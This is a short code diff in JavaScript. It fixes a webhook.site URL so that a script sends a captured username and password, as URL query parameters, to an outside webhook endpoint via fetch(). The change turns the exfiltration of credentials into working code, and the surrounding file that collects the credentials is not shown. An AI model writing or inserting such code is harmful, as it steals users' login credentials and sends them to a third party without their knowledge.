@@ -47,7 +47,8 @@ if (!username || !password) {
 }
 
 // Send the GET request
-const webhook_url = 'https://webhook.site/#!/view/dd3fec47-c7b3-4edb-b03d-5776296ef6e7';
+const webhook_url = 'https://webhook.site/dd3fec47-c7b3-4edb-b03d-5776296ef6e7';
+    
 const url = `${webhook_url}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 fetch(url, { method: 'GET' });
 
